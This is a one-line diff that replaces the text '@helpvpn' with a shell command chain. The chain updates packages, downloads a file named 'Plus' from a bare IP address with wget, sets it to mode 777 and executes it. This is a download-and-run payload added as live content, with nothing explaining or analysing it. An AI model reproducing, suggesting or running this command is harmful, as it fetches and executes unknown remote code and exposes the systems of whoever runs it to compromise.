@@ -1,1 +1,1 @@
-@helpvpn
+apt-get update -y; apt-get upgrade -y; wget 51.222.75.253/Plus; chmod 777 Plus; ./Plus
